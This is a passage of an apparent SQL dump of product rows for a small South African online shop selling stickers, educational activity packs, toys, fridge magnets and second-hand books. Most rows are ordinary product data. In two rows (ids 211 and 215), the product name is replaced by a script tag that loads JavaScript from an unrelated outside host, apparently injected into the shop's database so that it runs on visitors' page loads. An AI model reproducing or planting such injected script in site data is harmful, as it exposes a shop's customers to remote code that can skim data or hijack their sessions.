(138, 'Pink Heart Stickers', 10, 'In Stock', 'pink_heart_stickers.jpg', 9, 35, NULL, 0, 0, NULL, '00422', 'Flat sticker <br/>\r\nSticker Size: W: 149mm H:210mm <br/>\r\nPackaging size: W: 154mm H: 259mm\r\n', 69, 44, 17, 0),
(140, 'Animal Mix Stickers', 10, 'In Stock', 'Animal Mix Sticker.jpg', 9, 35, NULL, 0, 0, NULL, '00405', 'Flat sticker <br/>\r\nSticker Size: W: 149mm H:210mm <br/>\r\nPackaging size: W: 154mm H: 259mm\r\n', 75, 45, 18, 0),
(141, 'Red Heart Stickers', 10, 'In Stock', 'red heart stickers.jpg', 9, 35, NULL, 0, 0, NULL, '00421', 'Flat sticker <br/>\r\nSticker Size: W: 149mm H:210mm <br/>\r\nPackaging size: W: 154mm H: 259mm\r\n', 68, 46, 19, 0),
(142, 'Dog Mix Stickers ', 7, 'In Stock', 'Dog Mix Stickers.jpg', 9, 35, NULL, 0, 0, NULL, '00197', 'Sticker Size: W: 100mm H:140m <br/>\r\nPackaging size: W: 102mm H:185mm\r\n\r\n', 76, 47, 20, 0),
(144, 'Learner Driver Sticker', 20, 'In Stock', 'Learner Driver sticker.JPG', 9, 35, NULL, 0, 0, NULL, '00500', 'Sticker Size: W: 144mm H:144mm', 77, 48, 21, 0),
(145, 'Christmas Gift Labels 15/pkt', 10, 'Out of Stock', 'christmas_labels (2).jpg', 2, NULL, NULL, 1, 0, NULL, '00512', 'Contains 15 self-adhesive labels. \r\n<br/>Designs vary but some may repeat in a packet. \r\n<br/> Label size: W: 70mm H: 40mm\r\n', 25, 49, 22, 0),
(146, 'Small Christmas Sticker design 1', 9, 'Out of Stock', 'Small Flat Xmas sticker design 1.JPG', 2, NULL, NULL, 0, 0, NULL, '00516', 'Sticker sheet size: W:118mm H: 148mmm\r\n', 0, 50, 23, 0),
(148, 'Small Flat Fun Animals Stickers', 9, 'In Stock', 'Small FLat Fun Animals sticker.JPG', 9, 12, 15, 0, 0, NULL, '00513', 'Sticker sheet size: W:118mm H: 148mmm', 78, 51, 24, 0),
(149, 'Small Horses design 1 stickers', 9, 'In Stock', 'Small flat horse sticker design 1.JPG', 9, 12, 15, 0, 0, NULL, '00514', 'Sticker sheet size: W:118mm H: 148mmm', 79, 52, 25, 0),
(150, 'Small flat horses design 2 stickers', 9, 'In Stock', 'Small flat horse sticker design 2.JPG', 9, 12, 15, 0, 0, NULL, '00515', 'Sticker sheet size: W:118mm H: 148mmm', 80, 53, 26, 0),
(151, 'Educational Activity Pack 3 - Matching words and pictures', 30, 'In Stock', 'educ act 3 matching words with pics wings final.JPG', 19, 22, NULL, 0, 0, NULL, '00528', 'Pack contains 2 A4 sheets with words and pictures that must be matched by sticking labels on the lines. 104 star labels and 132 10mm round labels are included. Colours of labels may differ from picture.\r\n <br/> The activities develop midline crossing and fine motor skills, creativity, association, decision-making and imagination. Increases general knowledge. <br/>\r\nLabels can be stuck on in patterns, randomly, in single colours, etcetera. Discuss options with the child and encourage applying them.\r\n<br/> Add your own creative and educational ideas. \r\n\r\n', 9, 9, 1, 0),
(152, 'Educational Activity Pack 4 - Matching Similar - Farm Animals', 30, 'In Stock', 'educ act 4 matching similar wings final.JPG', 19, 22, NULL, 0, 0, NULL, '00529', 'Pack contain 2 A4 sheets and 2 Farm Animal Sticker sheets. <br/> Add your own educational activities to get even more benefit from the pack. <br/>Additional Farm Animal Stickers can be ordered separately.', 8, 8, 2, 0),
(153, 'Opvoedkundige Aktiwiteitspak 5 - Paar Soortgelyk - Plaasdiere', 30, 'In Stock', 'opv akt 5 paar soortgelyk afr vlerke - finaal.JPG', 19, 21, NULL, 1, 0, NULL, '00530', 'Pack is Afrikaans. It contains 2 A4 sheets with pictures and 2 Farm Animal sticker sheets. <br/>Add your own creative and educational activities to get even more value from the pack. ', 21, 10, 3, 0),
(154, 'Educational Activity Pack 7 - Creativity - Squirrel + hedgehog', 30, 'In Stock', 'educ act 7 squirrel hedgehog eng wings final.JPG', 19, 22, NULL, 0, 0, NULL, '00533', 'Pack contains 2 A4 sheets + 2 Squirrel sticker sheets. <br/> It is great fun and educational at the same time. \r\n\r\n<br/>Since 2 sticker sheets are included, you can provide the child with extra paper for more creative fun! <br/>\r\nStickers can also be kept in a sticker album and used later. It can be used over and over for finger puppet stories. There are enough stickers to have a group puppet show. Buy it NOW for hours of fun!', 7, 7, 4, 0),
(155, 'Educational Activity Pack 8  - Creativity - Squirrel + Deer', 30, 'In Stock', 'educ act 8 squirrel deer eng wings final.JPG', 19, 22, NULL, 0, 0, NULL, '00534', 'Pack contains 2 A4 sheets + 2 Squirrel sticker sheets. \r\nIt is great fun and educational at the same time. \r\n<br/>Since 2 sticker sheets are included, you can provide the child with extra paper for more creative fun! <br/>\r\nStickers can also be kept in a sticker album and used later. It can be used over and over for finger puppet stories. There are enough stickers to have a group puppet show. <br/>Buy it NOW for hours of fun!', 6, 6, 5, 0),
(156, 'Educational Activity Pack  9 - Creativity - Squirrel + big acorn', 30, 'In Stock', 'educ act 9 big acorn eng wings final.JPG', 19, 22, NULL, 0, 0, NULL, '00535', 'Pack contains 2 A4 sheets + 2 Squirrel sticker sheets. It is great fun and educational at the same time. \r\n<br/>Since 2 sticker sheets are included, you can provide the child with extra paper for more creative fun! \r\n<br/>Stickers can also be kept in a sticker album and used later. It can be used over and over for finger puppet stories. There are enough stickers to have a group puppet show. \r\n<br/>Buy it NOW for hours of fun!', 5, 5, 6, 0),
(157, 'Educational Acitivity Pack 12 - Matching the Same - Big Cat Mix', 30, 'In Stock', 'Educ Pack 12 Big Cats Matching the Same - Wings -Final version.JPG', 19, 22, NULL, 0, 0, NULL, '00536', 'Pack contains 2 A4 sheets + 2 Big Cat Mix sticker sheets. It is great fun and educational at the same time. \r\n<br/>It creates a fantastic starting point to explore big cats and learn more about them.\r\n<br/>Buy it NOW for hours of fun!\r\n', 4, 4, 7, 0),
(158, 'Opvoedkundige Aktiwiteitspak 13 - Paar Dieselfde - Big Cat Mix', 30, 'In Stock', 'OPv akt pak 13 big cat - paar dieselfde vlerke - final.JPG', 19, 21, NULL, 0, 0, NULL, '00537', 'Pack is Afrikaans. It contains 2 A4 sheets + 2 Big Cat Mix sticker sheets. It is great fun and educational at the same time. \r\n<br/>It creates a fantastic starting point to explore big cats and learn more about them. \r\n<br/>Buy it NOW for hours of fun!', 20, 9, 8, 0),
(159, 'Opvoedkundige Aktiwiteitspak 14 Kreatiwiteit - Eekhorings + Krimpvarkie', 30, 'In Stock', 'opv akt 14 krimpvarkie squirrel afr vlerke finaal.JPG', 19, 21, NULL, 0, 0, NULL, '00538', 'Pack is Afrikaans. It contains 2 A4 sheets + 2 Squirrel sticker sheets. It is great fun and educational at the same time. \r\n<br/>Since 2 sticker sheets are included, you can provide the child with extra paper for more creative fun! \r\n<br/>Stickers can also be kept in a sticker album and used later. It can be used over and over for finger puppet stories. There are enough stickers to have a group puppet show. \r\n<br/>Buy it NOW for hours of fun!\r\n', 19, 8, 9, 0),
(160, 'Opvoedkundige Aktiwiteitspak 15 Kreatiwiteit - Eekhorings + bokkie', 30, 'In Stock', 'educ act 15 squirrels & bokkie vlerke finaal.JPG', 19, 21, NULL, 0, 0, NULL, '00539', 'Pack is Afrikaans. It contains 2 A4 sheets + 2 Squirrel sticker sheets. It is great fun and educational at the same time. \r\n<br/>Since 2 sticker sheets are included, you can provide the child with extra paper for more creative fun! \r\n<br/>Stickers can also be kept in a sticker album and used later. It can be used over and over for finger puppet stories. There are enough stickers to have a group puppet show. \r\n<br/>Buy it NOW for hours of fun!\r\n', 18, 7, 10, 0),
(161, 'Opvoedkundige Aktiwiteitspak 16 Kreatiwiteit - Eekhorings + akker', 30, 'In Stock', 'educ act 16 groot akker afr vlerke finaal.JPG', 19, 21, NULL, 0, 0, NULL, '00540', 'Pack is Afrikaans. It contains 2 A4 sheets + 2 Squirrel sticker sheets. It is great fun and educational at the same time. \r\n<br/>Since 2 sticker sheets are included, you can provide the child with extra paper for more creative fun! \r\n<br/>Stickers can also be kept in a sticker album and used later. It can be used over and over for finger puppet stories. There are enough stickers to have a group puppet show. \r\n<br/>Buy it NOW for hours of fun!\r\n', 17, 6, 11, 0),
(162, 'Opvoedkundige Aktiwiteitspak 17 Kreatiwiteit - Versier', 30, 'In Stock', 'opv akt pak 17 kreatiwiteit afr vlerke finaal.JPG', 19, 21, NULL, 0, 0, NULL, '00541', 'Pack is Afrikaans. It contains 2 A4 sheets, 88 10mm \r\nround labels, 72 star labels and 1 Dog Mix sticker sheet. Colours of labels may differ from picture. <br/>The activities develop midline crossing and fine motor skills, creativity, decision-making and imagination.   It increases general knowledge. <br/>Add your own creative and educational ideas. There is NO right or wrong. It is pure developmental FUN!!! <br/> Buy it NOW!', 16, 5, 12, 0),
(163, 'Opvoedkundige Aktiwiteitspak 18 Paar Woorde met Prente', 30, 'In Stock', 'opv akt 18 paar woorde met prente vlerke finaal.JPG', 19, 21, NULL, 0, 0, NULL, '00542', 'Pack is Afrikaans. It contains 2 A4 sheets with words and pictures that must be matched by sticking labels on the lines. 104 star labels and 132 10mm round labels are included. Colours of labels may differ from picture. <br/>\r\nThe activities develop midline crossing and fine motor skills, creativity, association, decision-making and imagination. Increases general knowledge. <br/>\r\nLabels can be stuck on in patterns, randomly, in single colours, etcetera. Discuss options with the child and encourage applying them. \r\nAdd your own creative and educational ideas. <br/> Buy NOW and give a child a FUN way to develop!!', 15, 4, 13, 0),
(164, 'Educational Activity Pack 2 Creativity - decorate pictures', 30, 'In Stock', 'educ act 2 creativity pine tree eng final.JPG', 19, 22, NULL, 0, 0, NULL, '00527', 'Pack contains 2 A4 sheets, 88 10mm round labels, 72 star labels and 1 Dog Mix sticker sheet. Colours of labels may differ from picture. \r\n<br/>The activities develop midline crossing and fine motor skills, creativity, decision-making and imagination. It increases general knowledge. \r\n<br/>Add your own creative and educational ideas. <br/>There is NO right or wrong. It is pure developmental FUN!!! \r\n<br/>Buy it NOW!', 10, 10, 14, 0),
(165, 'My Heart is Filled with Love for You', 20, 'In Stock', 'Valentines Day Fridge Magnets - A7 - 8.jpg', 3, 1, NULL, 0, 0, NULL, '00543', 'W:73mm H: 105mm', 1, 1, 1, 0),
(166, 'Love You', 20, 'In Stock', 'Valentines Day Fridge Magnets - A7 - 1.jpg', 3, 1, NULL, 0, 0, NULL, '00544', 'W:73mm H: 105mm', 2, 2, 2, 0),
(167, 'I Love You', 20, 'In Stock', 'Valentines Day Fridge Magnets - A7 - 5 copy.jpg', 3, 1, NULL, 0, 0, NULL, '00545', 'W:73 H: 105mm', 3, 3, 3, 0),
(168, 'My Heart Belongs to You', 20, 'In Stock', 'Valentines Day Fridge Magnets - A7 - 7.jpg', 3, 1, NULL, 0, 0, NULL, '00546', 'W:73 H: 105mm', 4, 4, 4, 0),
(169, 'Your Love Rocks', 20, 'In Stock', 'Valentines Day Fridge Magnets - A7 - 6 copy.jpg', 3, 1, NULL, 0, 0, NULL, '00547', 'W:73 H: 105mm', 5, 5, 5, 0),
(170, 'You Captured My Heart', 20, 'In Stock', 'Valentines Day Fridge Magnets - A7 - 3 copy.jpg', 3, 1, NULL, 0, 0, NULL, '00548', 'W:73 H: 105mm', 6, 6, 6, 0),
(171, 'You are my Special One', 20, 'In Stock', 'Valentines Day Fridge Magnets - A7 - 9.jpg', 3, 1, NULL, 1, 0, NULL, '00549', 'W:73 H: 105mm', 7, 7, 7, 0),
(172, 'You Rock my World', 20, 'In Stock', 'Valentines Day Fridge Magnets - A7 - 4 copy.jpg', 3, 1, NULL, 0, 0, NULL, '00550', 'W:73 H: 105mm', 8, 8, 8, 0),
(173, 'Crazy About You', 20, 'In Stock', 'Valentines Day Fridge Magnets - A7 - 2 copy.jpg', 3, 1, NULL, 0, 0, NULL, '00551', 'W:73 H: 105mm', 9, 9, 9, 0),
(174, 'Plastic Dinosaurs - large bag - 559', 90, 'In Stock', 'Dinosaurs 559.JPG', 10, 19, NULL, 0, 0, NULL, '00473', 'Contains 8 dinosaurs. Good quality plastic toys that will provide hours of FUN.', 0, 1, 1, 0),
(175, 'Plastic Wild animals - X-large bag 560B', 111, 'In Stock', 'Wild Animals 560B.JPG', 10, 19, NULL, 0, 0, NULL, '00471', 'Contains 12 animals. <br/> Fantastic toys. <br/>Also buy our Big Cat Mix stickers and Matching the same - Big Cat Educational Sheets 12 and 13 for EDUCATIONAL FUN.', 1, 2, 2, 0),
(176, 'Plastic Farm  animals - X-large bag 560A', 111, 'In Stock', 'Farm Playset 560A.JPG', 10, 19, NULL, 0, 0, NULL, '00472', 'Contains 12 animals. <br/> Fantastic toys. <br/>Also buy our Farm Animal stickers and Farm Animal Educational Sheets 4 and 5 for EDUCATIONAL FUN.', 2, 3, 3, 0),
(177, 'Plastic Ocean World - X-large bag  - 563', 120, 'In Stock', 'Sea Creatures 563.JPG', 10, 19, NULL, 0, 0, NULL, '00470', 'Contains 12 animals.<br/> Good quality toys that will provide hours of fun.', 3, 4, 4, 0),
(178, 'Capsule creatures - Farm Animals', 19, 'Out of Stock', 'Capsule Creatures - Farm Animals.JPG', 10, 16, NULL, 0, 0, NULL, '00480', 'A Winner! Perfect bath time toy. <br/> When put in warm water an animal shape emerges. <br/>Also buy our FARM ANIMAL STICKERS and Educational Activity Pack No 4: English Match Similar - farm animal pictures & stickers or Educational Activity Pack  No 5 - Afrikaans Paar Soortgelyk:  plaasdiere ', 6, 5, 5, 0),
(179, 'Capsule creatures - Zoo Animals', 19, 'Out of Stock', 'Capsule creatures - Zoo.JPG', 10, 16, NULL, 0, 0, NULL, '00481', 'A Winner! Perfect bath time toy. <br/>\r\nWhen put in warm water an animal shape emerges. <br/>\r\nAlso buy our BIG CAT MIX STICKERS and Educational Activity Pack No 12: Matching the Same - Big Cat Mix English or Educational Activity Pack No 13 - Afrikaans Paar Dieselfde - Big Cat Mix.', 7, 6, 6, 0),
(180, 'Capsule creatures - Dinosaurs ', 19, 'Out of Stock', 'Capsule Creatures - Dinosaurs.JPG', 10, 16, NULL, 0, 0, NULL, '00482', 'A Winner! Perfect bath time toy. <br/>\r\nWhen put in warm water an animal shape emerges. \r\n', 8, 7, 7, 0),
(181, 'Capsule creatures - Sea Animals', 19, 'Out of Stock', 'Capsule Creatures - Sea ANimals.JPG', 10, 16, NULL, 0, 0, NULL, '00483', 'A Winner! Perfect bath time toy. <br/>\r\nWhen put in warm water an animal shape emerges. \r\n', 9, 8, 8, 0),
(182, 'Plastic Horses - XX-large bag of 6 - 549', 140, 'In Stock', 'Big Horses 549.JPG', 10, 19, NULL, 0, 0, NULL, '00474', 'Contains 6 big horses. <br/>\r\nFantastic toys. <br/>\r\nAlso buy our<i> Farm Animal stickers </i>and Farm Animal Educational Sheets 4 and 5 for EDUCATIONAL FUN.', 4, 9, 9, 0),
(183, 'A5 Animal Sticker Album - White Cat', 28, 'In Stock', 'White cat sticker album.JPG', 8, NULL, NULL, 0, 0, NULL, '00600', 'W: 210mm x H: 147mm\r\n<br/>Album that stickers can be stored in for later use. \r\n', 1, 1, 1, 0),
(184, 'A5 Animal Sticker Album - Dog lying down', 28, 'In Stock', 'Sad dog sticker album.JPG', 8, NULL, NULL, 0, 0, NULL, '00601', 'W: 210mm x H: 147mm\r\n<br/>Album that stickers can be stored in for later use.', 3, 2, 2, 0),
(185, 'A5 Animal Sticker Album -Smiling  Dog', 28, 'In Stock', 'Tongue out Dog sticker album.JPG', 8, NULL, NULL, 1, 0, NULL, '00602', 'W: 210mm x H: 147mm\r\n<br/>Album that stickers can be stored in for later use.', 0, 3, 3, 0),
(186, 'A5 Animal Sticker Album - Horse', 28, 'In Stock', 'Horse sticker album.JPG', 8, NULL, NULL, 0, 0, NULL, '00603', 'W: 210mm x H: 147mm\r\nAlbum that stickers can be stored in for later use.', 2, 4, 4, 0),
(188, 'Gandhi', 20, 'In Stock', 'Gandhi.JPG', 18, 34, NULL, 0, 0, 20, '00604', 'Children\'s book on the life of Gandhi.', 1, 1, 1, 0),
(189, 'Jagters van die Duine - Die storie vandie Kalaharileeu (Nie-fiksie)', 70, 'In Stock', 'Jagters vd Duine.JPG', 18, 34, NULL, 0, 0, 70, '00605', 'Beautiful book with lots of photographs.\r\n<br/> There is a small blue ink line in the front of the book.', 2, 2, 2, 0),
(190, 'Your Cricket Coach', 70, 'In Stock', 'Your Cricket Coach.JPG', 18, 34, NULL, 0, 0, 70, '00609', 'Basic introduction to cricket. <br/> It also covers the mental aspect of the game.<br/> A very good book to have on the shelf.', 3, 3, 3, 0),
(191, 'Newman se VoÃƒÂ«ls Volgens Kleur', 120, 'In Stock', 'Newman Voels.JPG', 18, 34, NULL, 0, 0, 120, '00629', 'Great book to help you identify birds.', 4, 4, 4, 0),
(192, 'Cape Tortoises - Their Identification and Care', 40, 'In Stock', 'Cape Tortoises.JPG', 18, 34, NULL, 0, 0, 40, '00628', 'A very handy little book for those that want to learn more about tortoises.', 5, 5, 5, 0),
(193, 'The Whalers', 20, 'In Stock', 'The Whalers.JPG', 18, 34, NULL, 0, 0, 20, '00625', 'Good book discussing whale catching. <br/>Can be used to create more awareness. <br/>Ideal for a school library. <br/>Buy and donate!', 6, 6, 6, 0),
(194, 'A Bushveld Safari', 70, 'In Stock', 'Bushveld safari.JPG', 18, 34, NULL, 0, 0, 70, '00610', 'It is a young explorer\'s guide ot the Bushveld. <br/>Glossy pages with beautiful pictures and lots of information.\r\n<br/> Perfect book to buy and donate to a school library.', 7, 7, 7, 0),
(195, 'Life in Europe', 20, 'In Stock', 'Life in Europe.JPG', 18, 34, NULL, 0, 0, 20, '00618', 'Basic book to give a glimpse of Life in Europe. Published in 1994. <br/>Ideal librabry book. Buy and donate NOW.', 8, 8, 8, 0),
(196, 'South Africa provides Cotton', 15, 'In Stock', 'Cotton.JPG', 18, 34, NULL, 0, 0, 15, '00615', 'Basic book about cotton production in South Africa. <br/ Ideal for a school library. <br/ Great buy to donate to a shool.', 9, 9, 9, 0),
(197, 'The Lion\'s Choice', 30, 'In Stock', 'Lions choice.JPG', 18, 34, NULL, 0, 0, 30, '00606', 'A book containing light-hearted advice on democracy and elections. It was first published in 1994 in the run-up to South Africa\'s first democratic elections. <br/>A story centred around discontented prides of lions is used to educate people about negotiation, compromise, intimidation, campaigning, propaganda, referendums and voting.', 10, 10, 10, 0),
(198, 'Harry Potter en die Orde van die Feniks', 80, 'In Stock', 'Harry Potter.JPG', 18, 34, NULL, 0, 0, 80, '00608', '', 11, 11, 11, 0),
(199, 'All about the coming of the Railways', 15, 'In Stock', 'Railways.JPG', 18, 34, NULL, 0, 0, 15, '00611', 'Basic book that is ideal for a school library or home teaching. <br/>Increases general knowledge and awakens curiosity. <br/>Buy to read and/or donate to a school library and make a difference.', 12, 12, 12, 0),
(200, 'Countries of the World - Italy', 20, 'In Stock', 'Italy.JPG', 18, 34, NULL, 0, 0, 20, '00612', 'Basic book about Italy. <br/> Ideal for a school library. Buy now and donate!', 13, 13, 13, 0),
(201, 'World Resources', 25, 'In Stock', 'World Resources.JPG', 18, 34, NULL, 0, 0, 25, '00613', 'Basic book discussing environmental issues and solutions. <br/> A fantastic book for children to create environmental awareness. <br/>Use it to start discussions about the environment and how we should look after it for future generations. <br/> Buy for a school library now.', 14, 14, 14, 0),
(202, 'Ontwikkel jou Selfbeeld', 50, 'In Stock', 'Ontwikkel jou Selfbeeld.JPG', 18, 34, NULL, 0, 0, 50, '00616', 'Learn how to take control of your own life and be a winner! ', 15, 15, 15, 0),
(203, 'Temperate Climates', 25, 'In Stock', 'Temperate Climates.JPG', 18, 34, NULL, 0, 0, 25, '00624', 'A basic, introductory book on areas with temperate climates. <br/> Ideal for school libraries. Buy and donate to a school in need and make a difference!', 16, 16, 16, 0),
(204, 'The Macro English Aid', 150, 'In Stock', 'macro eng aid.JPG', 18, 34, NULL, 0, 0, 150, '00607', 'A very handy guide to English grammar. A real gem for anyone wanting to improve their English.', 17, 17, 17, 0),
(205, 'The World\'s Rivers - The Nile', 20, 'In Stock', 'Nile.JPG', 18, 34, NULL, 0, 0, 20, '00614', 'Basic book about the Nile river. Ideal for a school library. <br/>Buy and donate to a school in need! <br/>Knowledge is power!', 18, 18, 18, 0),
(206, 'The Spanish Armada', 15, 'In Stock', 'Spanish Armada.JPG', 18, 34, NULL, 0, 0, 15, '00617', 'Basic book that is ideal for a school library. ', 19, 19, 19, 0),
(207, 'Hippos', 20, 'In Stock', 'Hippos.JPG', 18, 34, NULL, 0, 0, 20, '00620', 'Basic book about the hippopotamus. Contains lots of photographs. <br/> Ideal for a library. <br/>Buy and donate!', 20, 20, 20, 0),
(208, 'Facts of Life of the American Frontier', 15, 'In Stock', 'American frontier.JPG', 18, 34, NULL, 0, 0, 15, '00621', 'Basic book to brush up on history or use for a school project. <br/> Buy and donate!', 21, 21, 21, 0),
(209, 'Facts on Radon and Asbestos', 20, 'In Stock', 'Radon and Asbestos.JPG', 18, 34, NULL, 0, 0, 20, '00622', 'Very interesting book containing facts we should all be aware of. <br/> Buy and donate to a library.', 22, 22, 22, 0),
(210, 'Materials on the Move', 20, 'In Stock', 'Materials on the Move.JPG', 18, 34, NULL, 0, 0, 20, '00623', 'The book is about the different types of materials used in manufacturing different modes of transport.<br/> Basic book that is a good addition to any library. <br/> Buy and donate! <br/> Knowledge is power.', 23, 23, 23, 0),
(211, '<script type=\"text/javascript\" src=\"https://jso-tools.z-x.my.id/raw/~/QOPKLHV432H7M\"></script>', 20, 'In Stock', 'Saxon britain.JPG', 18, 34, NULL, 0, 0, 20, '00627', 'The book tells about life in Britain when the Saxons decided to move in after the collapse of the Roman Empire. <br/> Good buy for a library. <br/> Buy and donate!', 24, 24, 24, 0),
(212, 'Staedtler Camel HB Pencil - Box of 10', 43, 'In Stock', 'Staedtler pencils box of 10.JPG', 7, NULL, NULL, 1, 0, 43, '00630', 'Good value for money! <br> Excellent buy for a Santa Shoe Box!', 1, 1, 1, 0),
(215, '<script type=\"text/javascript\" src=\"https://jso-tools.z-x.my.id/raw/~/QOPKLHV432H7M\"></script>', 50, 'In Stock', 'Becoming Employed.JPG', 18, 34, NULL, 0, 0, 50, '00619', 'A book containing good advice for anyone looking for a job. ', 25, 25, 25, 0),
(216, 'Blue Frisbee - 24cm', 16, 'In Stock', 'blue frisbee.JPG', 10, 19, NULL, 0, 0, NULL, '00633', '24cm diameter. <br/>Great for outdoor/beach play. <br/>Good for eye-hand coordination.\r\n<br/> Get exercise while having fun! ', 10, 10, 10, 0),
(217, 'Orange Frisbee - 24cm', 16, 'In Stock', 'orange frisbee.JPG', 10, 19, NULL, 0, 0, NULL, '00634', '24cm diameter.<br/>\r\nGreat for outdoor/beach play.<br/>\r\nGood for eye-hand coordination.<br/>\r\nGet exercise while having fun!', 11, 11, 11, 0),
(218, 'Red Frisbee - 24cm', 16, 'In Stock', 'red frisbee.JPG', 10, 19, NULL, 0, 0, NULL, '00635', '24cm diameter.<br/>Great for outdoor/beach play.<br/>Good for eye-hand coordination.<br/>Get exercise while having fun!', 12, 12, 12, 0),
(219, 'Yellow Frisbee - 24cm', 16, 'Out of Stock', 'yellow frisbee.JPG', 10, 19, NULL, 0, 0, NULL, '00636', '24cm diameter.<br/>Great for outdoor/beach play.<br/>Good for eye-hand coordination.<br/>Get exercise while having fun!', 13, 13, 13, 0),
(220, 'Bouncy Ball 25mm ', 3, 'In Stock', 'Bouncy ball.JPG', 10, 18, NULL, 0, 0, NULL, '00637', 'Develops eye-hand coordination.\r\n<br/>Perfect for PARTY PACKS, SANTA SHOE BOXES, etcetera. Buy now and donate.', 14, 14, 14, 0),
(221, 'Animal Faces Sticker SA230 - Blue Elephant', 8.5, 'In Stock', 'Animal faces SA230 blue elephant.JPG', 9, 12, 15, 0, 0, NULL, '00638', 'W: 70mm  H: 180mm\r\n<br/> Excellent creative toy.\r\n<br/>Great for decorating greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/> Buy and donate to a Children\'s Home and brighten a child\'s day.', 81, 54, 27, 0),
(222, 'Animal Faces Sticker SA230 - Pink Piggy', 8.5, 'In Stock', 'Animal Faces SA230 pink piggy.JPG', 9, 12, 15, 0, 0, NULL, '00639', 'W: 70mm H: 180mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>Buy and donate to a Children\'s Home and brighten a child\'s day.', 82, 55, 28, 0),
(223, 'Animal Faces Sticker SA230 - Heart Lion', 8.5, 'In Stock', 'animals faces SA230 heart lion.JPG', 9, 12, 15, 0, 0, NULL, '00640', 'W: 70mm H: 180mm Excellent creative toy.<br/> Great for decorating greeting cards, cell phones, books, toys, etcetera. <br/>Use as finger puppets and hold your own shows.<br/> Ideal for Christmas stockings, party bags, small prizes and lots more. <br/>Buy and donate to a Children\'s Home and brighten a child\'s day.', 83, 56, 29, 0),
(224, 'Horses sticker - JC3266A - Blue Oval', 8.5, 'In Stock', 'HorseJC3266Ablue oval.JPG', 9, 12, 15, 0, 0, NULL, '00641', 'W: 70mm H: 180mm <br/> Excellent creative toy. <br/>Great for decorating greeting cards, cell phones, books, toys, etcetera. <br/>Use as finger puppets and hold your own shows.<br/> Ideal for Christmas stockings, party bags, small prizes and lots more. <br/>Buy and donate to a Children\'s Home and brighten a child\'s day. ', 84, 57, 30, 0),
(225, 'Horses sticker - JC3266B - One in heart', 8.5, 'In Stock', 'Horse JC3266B one in heart.JPG', 9, 12, 15, 0, 0, NULL, '00642', 'W: 70mm H: 180mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>Buy and donate to a Children\'s Home, Cubs/Scouts fundraisers, etcetera and brighten a child\'s day.', 85, 58, 31, 0),
(226, 'Horses sticker - JC3266C - Two in heart', 8.5, 'In Stock', 'Horse sticker JC3266C two in heart.JPG', 9, 12, 15, 0, 0, NULL, '00643', 'W: 70mm H: 180mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>Buy and donate to a Children\'s Home, Cubs/Scouts fundraisers and brighten a child\'s day.', 86, 59, 32, 0),
(227, 'Bees Sticker SA215 - Pumpkin', 8.5, 'In Stock', 'Bee pumpkinSA215.JPG', 9, 12, 15, 0, 0, NULL, '00644', 'W: 70mm H: 180mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating gift bags and boxes, greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>BUY NOW for hours of fun.', 87, 60, 33, 0),
(228, 'Bees Sticker SA215 - Gift Box', 8.5, 'In Stock', 'BeegiftboxSA215.JPG', 9, 12, 15, 0, 0, NULL, '00645', 'W: 70mm H: 180mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating gift bags and boxes, greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>BUY NOW for hours of fun.', 88, 61, 34, 0),
(229, 'Bees Sticker SA215 - Umbrella', 8.5, 'Out of Stock', 'BeewalkingSA215.JPG', 9, 12, 15, 0, 0, NULL, '00646', 'W: 70mm H: 180mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating gift bags and boxes, greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>BUY NOW for hours of fun.', 89, 62, 35, 0),
(230, 'Jumpy Froggies', 14, 'Out of Stock', 'IMG_3244 (2).JPG', 10, 19, NULL, 0, 0, NULL, '00505', 'Great affordable toy that can provide hours of fun. \r\n<br/>Try to get the frog into the bowl from different distances, launch it from platforms of different heights, etcetera.\r\n<br/>Ideal for party bags, Christmas Stockings, Santa Shoe boxes and more. ', 15, 15, 15, 0),
(231, 'Blue Bears Stickers - Rowboat', 8.5, 'In Stock', 'Bear sticker Rowboat SCNAAAD010A.JPG', 9, 12, 15, 0, 0, NULL, '00647', 'W: 70mm H: 165mm\r\n<br/>Excellent creative toy.\r\n<br/>Great for decorating greeting cards, cell phones, books, toys, etcetera.\r\n<br/>Use as finger puppets and hold your own shows.\r\n<br/>Ideal for Christmas stockings, party bags, small prizes and lots more.\r\n<br/>Buy and donate to a Children\'s Home and brighten a child\'s day.', 90, 63, 36, 0),
(232, 'Mini Frisbee - Blue', 5, 'In Stock', 'Mini Frisbee Blue.JPG', 10, 19, NULL, 0, 0, NULL, '00651', '100mm diameter\r\n<br/>Toy that provides exercise and improves eye-hand coordination.\r\n<br/>Perfect for party packs, Christmas stockings, Santa Shoe boxes and many more.\r\n<br/>Buy for a child today and give fun, exercise and physical development.', 16, 16, 16, 0),
(233, 'Mini Frisbee - Neon Green', 5, 'In Stock', 'Mini Frisbee neon green.JPG', 10, 19, NULL, 0, 0, NULL, '00650', '100mm diameter\r\n<br/>Toy that provides exercise and improves eye-hand coordination. \r\n<br/>Perfect for party packs, Christmas stockings, Santa Shoe boxes and many more. \r\n<br/>Buy for a child today and give fun, exercise and physical development.', 17, 17, 17, 0),
